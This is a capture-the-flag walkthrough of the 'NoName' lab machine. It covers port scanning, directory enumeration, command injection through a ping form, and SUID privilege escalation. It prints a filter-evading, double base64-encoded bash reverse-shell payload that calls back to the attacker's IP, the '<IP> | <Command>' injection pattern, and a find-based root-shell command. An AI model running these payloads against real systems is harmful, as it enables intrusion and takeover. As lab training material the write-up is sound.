# NoName

## Nmap

```
sudo nmap 192.168.64.15 -p- -sS -sV                               

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```

Checking out the target address shows we land on a page headed 'Fake Admin Area'. This page has a query box. I was unable to get any output from this or perform any command injection.

![/index.php](<../../../.gitbook/assets/image (1355).png>)

Further enumeration shows the /admin page being valid. This presents that page below.

![/admin](<../../../.gitbook/assets/image (1356).png>)

Nothing interesting here but we do have something in the page source.

![/admin](<../../../.gitbook/assets/image (1357).png>)

So far nowhere for this to be used but we can take a note of this. I decided from here to run some more specific enumeration against the target. Running `dirsearch.py` to append .txt and .php to end of a wordlist I was able to identify the /superadmin.php webpage.

```
python3 dirsearch.py -u http://192.168.64.15/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -r -t 75 --full-url --suffix=.txt,.php 
```

![](<../../../.gitbook/assets/image (1358) (1).png>)

So far this looks the same as the other page almost but we can actually test to see if the ping function works.

![/superadmin.php](<../../../.gitbook/assets/image (1359).png>)

Running `tcpdump` on our attacking machine to listen in on the interface tun0 for ICMP packets we can ping our attacking machine and can confirm if we take receipt of ICMP packets.

Start `tcpdump`:

```
sudo tcpdump -i tun0 icmp
```

Then after pinging our attacking machine from the web interface we see results which show ping is working.

![](<../../../.gitbook/assets/image (1360).png>)

Ideally we need to perform some form of command injection. Testing with the interface shows we need a IP at the begging of the command regardless. The linked GitHub has a large amount of command injection techniques to try: [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)

After some testing I found the following to work:

```
<IP> | <Command>
```

Switching over to `Burpsuite` we can see the value `192.168.49.79 | id` was sent as a query and returned valid results in the response.

![](<../../../.gitbook/assets/image (1361).png>)

From here I ran the following command in a terminal to generate double base64 encoded output.

```
echo "echo $(echo 'bash -i >& /dev/tcp/192.168.49.79/80 0>&1' | base64 | base64)|ba''se''6''4 -''d|ba''se''64 -''d|b''a''s''h" | sed 's/ /${IFS}/g'

#Output

echo${IFS}WW1GemFDQXRhU0ErSmlBdlpHVjJMM1JqY0M4eE9USXVNVFk0TGpRNUxqYzVMemd3SURBK0pqRUsK|ba''se''6''4${IFS}-''d|ba''se''64${IFS}-''d|b''a''s''h
```

Then encoded the output combined with the ping part of the command with Burpsuite encoder.

![](<../../../.gitbook/assets/image (1362).png>)

Then submitted the URL encoded value as a parameter in `Burpsuite`.

![](<../../../.gitbook/assets/image (1363).png>)

Resulting in a reverse shell on our `netcat` listener.

![](<../../../.gitbook/assets/image (1365).png>)

From here I then transferred over `linpeas` which after running found the binary 'find' has the SUID bit set.

![](<../../../.gitbook/assets/image (1364).png>)

Searching [GTFOBins](https://gtfobins.github.io/gtfobins/find/) we find this can be used to spawn a root shell.

![](<../../../.gitbook/assets/image (1366).png>)

I then run the following command to gain a root shell.

```
/usr/bin/find . -exec /bin/sh -p \; -quit
```

![](<../../../.gitbook/assets/image (1367).png>)
